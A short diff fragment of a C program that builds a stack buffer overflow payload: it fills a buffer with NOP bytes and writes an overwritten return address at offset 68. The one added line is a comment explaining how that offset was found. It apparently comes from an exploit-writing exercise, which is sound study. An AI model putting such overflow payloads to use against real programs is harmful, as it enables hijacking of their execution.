@@ -64,6 +64,7 @@ main ( int argc, char * argv[] )
 		tmp[i] = '\x90';
 	}
 	
+	//since buf starts with "AAAA" (4bytes), so the return address should be at 72-4=68 in tmp.
 	tmp[68]='\x10';
 	tmp[69]='\xfe';
 	tmp[70]='\x21';
